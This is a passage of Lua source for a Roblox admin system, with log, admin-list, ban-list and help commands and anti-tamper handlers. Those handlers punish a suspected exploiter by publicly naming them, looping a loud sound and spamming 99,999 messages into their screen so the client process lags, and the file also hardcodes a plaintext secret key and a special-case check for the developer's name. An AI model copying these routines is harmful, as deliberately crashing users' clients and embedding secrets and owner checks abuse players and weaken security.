		 "..i.."\n"..concat --I would use table.concat, but it doesn't support going in reverse :(
	end
	
	DisplayScrollFrame(sender,"📝DMC Logs","Below is the past commands that was executed by a player.\n\This captures '/e' and cmdbar commands. You might see some\n\### in logs to comply with ROBLOX guidelines.",concat)
end

function Commands.chatlogs(whatev,sender)
		MinimumPermission(1,sender)
			local chatlo = ""
		--DisplayScrollFrame(sender,"📝 Chat Logs"," ")
--error("Not yet implemented")		
		for _,i in ipairs(chatlogs) do
		chatlo = " "..i.."\n"..chatlo
		end
	DisplayScrollFrame(sender,"📝 Chat Logs","Below is the list of text which logs the chat history.\n\This also captures messages silently, and team chat.\n\You might see some ### to comply with ROBLOX guidelines.",chatlo)
end

function Commands.admins(whatev,sender)
	MinimumPermission(1,sender)
	local str = ""
	local str1 = ""
	local str2 = ""
	local str3 = ""
	
	for _,i in pairs(SuperAdmins) do
		if i ~= "Your Best Friend" then
			str = str..i.."\n"
		end
	end
	for _,i in pairs(Admins) do
		if i ~= "Your Friend" then
			str1 = str1..i.."\n"
		end
	end
	
	
	for _,i in pairs(SuperAdminUserIds) do
		if i ~= 2402402 and i ~= 261 then
			str2 = str2..tostring(i).."\n"
		end
	end
	
	for _,i in pairs(AdminUserIds) do
		if i ~= 1 and i ~= 2 and i ~= 3 then
			str3 = str3..tostring(i).."\n"
		end
	end
	
	DisplayScrollFrame(sender,"🔑 Game Admins","Contains a list of players who currently have admin.\n\If you admined someone while in game, it will only show in this\n\server only.","SuperAdmins:\n"..str.."\n \nAdmins:\n"..str1.."\n \nSuperAdmin User Ids:\n"..str2.."\n \nAdmin User Ids:\n"..str3)
end


function Commands.permissions(no,sender)
	DisplayMessage(sender,"Permissions","Your assigned permission level is "..LevelToString(Permissions[sender.Name]).." (Level "..tostring(Permissions[sender.Name])..")",8)
end


function Commands.adminlist(whatev,sender)
	Commands.admins(whatev,sender)
end

function Commands.eightball(args,sender)
	assert(args[1],"Provide a question.")
local RandomResponses = {
	"Yes.",
	"No.",
	"Maybe.",
	"Try again later.",
	"You might rely on it.",
	"Hm.. I'm not 100% sure, but I guess.",
	"Absolutely!",
	"My Module said no, so no.",
	"My Module said yes, so yes.",		
	"Do I look like I know? I don't.",		
	"Apparently, I can't say that.",		
	"Blog it.",
	"I can't process that question."
}

DisplayMessage(sender,"Magic 8-Ball",""..RandomResponses[math.random(1, #RandomResponses)],10)
end

function Commands.tryme(whatevslol,sender)
	if game.PlaceId == 896250178 then
		error("You're already playing the admin testing place, silly!")
	end
	DisplayMessage(sender,"Discover! Management Console","Teleporting to DMC Test Place, where you can try out the newer version of this admin!",15)
	wait(5)
	TeleportService:Teleport(896250178,sender)
end


function Commands.banlist(whatev,sender)
	MinimumPermission(1,sender)
	local str = ""
	
	for _,i in pairs(BannedPlayers) do
		str = str..i.."\n"
	end
	str = str:sub(1, #str-2)
	print(str)
	DisplayScrollFrame(sender,"❌ Banned Players","Below are the list of players who are currently banned.\n\Banned someone from this server?\n\Their name will only show in this server only.",str)
end


function Commands.cmds(whatev,sender)
	local num = 0
	
	for _ in pairs(Commands) do
		num = num + 1
	end
	
	local los_comandos = {}	

	
	local str =""
	
	for i,_ in pairs(Commands) do
		if i ~= "root" and 
			i ~= "updatefirmware" and 
			i ~= "envsecurity" and 
			i ~= "rootbanhammer" and
			i ~= "securitynote" and 
			i ~= "e" and 
			i ~= "clear" and 
			i ~= "console" and 
			i ~= "me"  and 
			i ~= "dance"  and 
			i ~= "dance2"  and 
			i ~= "dance3"  and 
			i ~= "t" and
			i ~= "wave" and
			i ~= "point" and
			i ~= "whisper" and
			i ~= "laugh" and
			i ~= "mute" and
			i ~= "unmute" and
			i ~= "w" and
			i ~= "c" then
			table.insert(los_comandos,i)
		end
	end
	
	table.sort(los_comandos)
	table.sort(desc)
	
	for _,i in pairs(los_comandos) do
		str = str..CommandPrefix..i.."\n"
	end
	
	DisplayScrollFrame(sender,"📄 Commands","Below are the list of available commands. To use a command,\n\ use the prefix: "..CommandPrefix.." followed by a command.\n\Examples: "..CommandPrefix.."btools 'PlayerName' "..CommandPrefix.."music 'ID'",str:sub(1, #str-1))
end

function Commands.help(whatev,sender)
	Commands.cmds(whatev,sender)
end

function Commands.commands(whatev,sender)
	Commands.cmds(whatev,sender)
end

-----------------------------------------------------------------
-------------- Initializes Script Builder Tools -----------------
-----------------------------------------------------------------

-----------------------------------------------------------------
----------------- Initializes Debugging Stuff -------------------
-----------------------------------------------------------------



if Debug then
	function _G.Admi.Chatted(plr,msg)
		Chatted(plr,msg)
	end
end


-----------------------------------------------------------------
-------------------- Finishes the Rest Up -----------------------
-----------------------------------------------------------------


end)
TeleportService.CustomizedTeleportUI = true

if AutoExecute and type(AutoExecute) == "string" then
	local NewExe = AutoExecute:gsub("\n\n","\n"):gsub("\t","")
	local ExtractedCommands = {}
	while NewExe:find("\n") do
		local nextLine,_ = NewExe:find("\n")
		local nextCommand = NewExe:sub(1,nextLine-1)
		NewExe = NewExe:sub(nextLine+1)
		pcall(function()
			--Chatted(root,nextCommand)
		end)
	end
end

for i,_ in pairs(getfenv()) do
	Sandboxer[i] = true
end

-- final check
script:WaitForChild("CONSOLE_PREFERENCES",10)
	if not script:FindFirstChild("CONSOLE_PREFERENCES") then
				error("\n\ CONSOLE_PREFERENCES is missing from DMC. Please check your DMC Settings for any errors.")
	end
	
script._CONSOLESTUFF.LOAD.Disabled = false			
warn("Discover! Management Console Server-Side loaded.") --Everything good.
script.Name = "Discover! Management Console"


--CMDBAR input
CTSU.OnServerEvent:connect(function(player,encyp,logtype,input)
local encypcode = "ac0887598d93cf8590b1ebf6cf8d79022cb956be"
	if encyp == nil then
				local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		table.insert(BannedPlayers,player.Name)
			DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to :FireServer() a command bar event, in which failed because he/she didn't have the decryption code to do so.",20)
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
					end
			end)	
	return
	end
	
		if encyp ~= "ac0887598d93cf8590b1ebf6cf8d79022cb956be" then
				local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		table.insert(BannedPlayers,player.Name)
			DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to :FireServer() a command bar event, in which failed because he/she didn't have the decryption code to do so.",20)
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
					end
			end)
	return
	end
	
	if player == nil then
		DisplayMessage(player,"DMC_EXECUTE_SECURITY","A player that's trying to execute this is missing.",15)
	return
	end
--[[	
	if encyp == nil then
		DisplayMessage(player,"DMC_EXECUTE_SECURITY","You're trying to execute a command that's missing a encryption code! Command can't execute without it for security reason.",15)
	return
	end
	
	if encyp ~= encryptcode then
	DisplayMessage(player,"DMC_EXECUTE_SECURITY","The encryption key to execute that command is invalid! Command couldn't execute.",15)
	return
	end]]
	
if input and player and (input:sub(1,#CommandPrefixCMDBAR) == CommandPrefixCMDBAR or (os.time() < 1396238400 and input:sub(1,1) == ":"))  or input:lower():sub(1,4) == "cmds" or input:lower():sub(1,8) == "commands" then
		
		local ok,err = pcall(function()
			if logtype ~="NoLog" then
			table.insert(logs,"[CMDBAR] ["..LevelToString(Permissions[player.Name] or 0).."] "..player.Name..": "..game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(input, player))	
			end
			if input:sub(1,1) == ":" then
				--DisplayMessage(player,"Console","Warning: After March 31st, \"Kohl's Admin\" syntax will be switched from : to /")
			end	
			
			local stuff = DecipherCommand(input:sub(1 + #CommandPrefixCMDBAR))
			local command = stuff[1]
			local args = {}
			if  input:lower():sub(1,4) == "cmds" or input:lower():sub(1,8) == "commands" then
				command = "help"
			end
			
			for i = 2, #stuff, 1 do
				table.insert(args,stuff[i])
			end		
			if rawget(Commands,command:lower()) then
				if player ~= root and player ~= "root" and player:WaitForChild("PlayerGui"):FindFirstChild("Admi") and player.PlayerGui.Admi:FindFirstChild("Msg") and player.PlayerGui.Admi.Msg:FindFirstChild("Msg") then
					if player.PlayerGui.DConsole.Msg.Msg.Text:find("This message will be here until another command is used") then
						DismissMessage(player)
						wait(tweentime)
					end
				end	
				if player ~= root and player ~= "root" then
					DMCExecutionHandler(function()
							rawget(Commands,command:lower())(args,((player["Name"]:lower()~="TechnologicalByte") and player) or (Permissions["technologicalbyte"] < 1 and root) or player)
					end)
				else
					rawget(Commands,command:lower())(args,player)
				end
			elseif Override_Syntax and ReportUnknownCommand or not Override_Syntax then
				Tell(player,"The command \""..(command or "").."\" does not exist. Double check your spelling; Command line does not need a prefix to execute commands. For a list of commands, type in "..CommandPrefix.."cmds or commands.",10)
				return
			end
		end)
		
		if not ok and err ~= nil then
			
			pcall(function()
				
				if err:find("CommandException:") then
					local _,comerrst = err:find("CommandException:")
					local comerr = err:sub(comerrst+1)
					DisplayMessage(player,"⚠ A Command Error has occurred","Your command couldn't be executed because:\n"..comerr,10)
				else
					table.insert(errorlogs,"Error:\n\
			"..tostring(err).. "\n\ \n\ ")
					DisplayMessage(player,"⚠ A DMC Error has occurred","DMC has encountered a illegal operation because: \n"..tostring(err).."\n \n An error has Occurred with Discover! Management Console due to human error, game error, or ROBLOX in general. Try again later, but if you're continuously getting this error, please contact TechnologicalByte with the error code you've recieved.\n\n\DMC has successfully recovered from this error.",15)
	end
			end)
		end
end
end)

--Curious hacker techniques!
TellSignal.OnServerEvent:connect(function(player)
		local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		table.insert(BannedPlayers,player.Name)
		DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to modify DMC configuration and has been kicked. Admins: the exploiter has been banned from this server.",20)
								if not player:FindFirstChild("PlayerGui") then
						player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, use your damn head.")
					end
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do -- For some reason it also lags the RobloxPlayerBeta.exe process, not just the game itself, awesome!
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
					end
			end)
end)


DisplayMessageSignal.OnServerEvent:connect(function(player)
		local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		table.insert(BannedPlayers,player.Name)
		DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to modify DMC configuration and has been kicked. Admins: the exploiter has been banned from this server.",20)
							if not player:FindFirstChild("PlayerGui") then
						player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, use your damn head.")
					end
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
					end
			end)
end)

DisplayScrollFrameSignal.OnServerEvent:connect(function(player)
		local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		table.insert(BannedPlayers,player.Name)
		DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to modify DMC configuration and has been kicked. Admins: the exploiter has been banned from this server.",20)
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
				end
			end)
end)


DisplayInputSignal.OnServerEvent:connect(function(player)	
		table.insert(BannedPlayers,player.Name)
		local BAN = Instance.new("Sound",player)
		BAN.SoundId = "rbxID://142449703"
		BAN.Volume = 10
		BAN.Looped = true
		BAN:Play()
		DisplayMessageAll("Exploit Alert!",""..player.Name.." has attempted to modify DMC configuration and has been kicked. Admins: the exploiter has been banned from this server.",20)
								if not player:FindFirstChild("PlayerGui") then
						player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, use your damn head.")
					end
			pcall(function()
				for _,a in pairs(player:GetChildren()) do
					if a:IsA("PlayerGui") then
						while wait() do
							for b = 1, 99999 do
								Instance.new("Message",a).Text = "DMC_EXECUTE_SECURITY\n\ Goodbye hacker.\n\ Next time, think before you do."
							end
							wait(3)
					player:kick("\n\ DMC_EXECUTE_SECURITY\n\ Goodbye hacker. Next time, think before you do.")
						end
					end
					end
			end)
end)
end)--The end of all

return module
